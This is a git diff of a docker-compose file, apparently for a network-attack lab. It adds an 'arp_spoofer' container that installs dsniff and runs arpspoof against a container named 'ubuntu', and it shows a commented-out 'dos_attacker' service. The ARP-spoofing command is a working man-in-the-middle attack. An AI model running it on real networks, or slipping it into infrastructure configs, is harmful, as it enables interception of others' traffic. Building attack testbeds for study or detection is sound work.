@@ -27,6 +27,12 @@ services:
     depends_on:
       - ubuntu
 
+  arp_spoofer:
+    image: ubuntu:22.04
+    container_name: arp_spoofer
+    restart: unless-stopped
+    command: bash -c "apt update > /dev/null 2>&1 && apt -y install dsniff > /dev/null 2>&1 && arpspoof -i eth0 -t ubuntu -r ubuntu && sleep 10"
+
 
   # dos_attacker:
   #   image: ubuntu:22.04
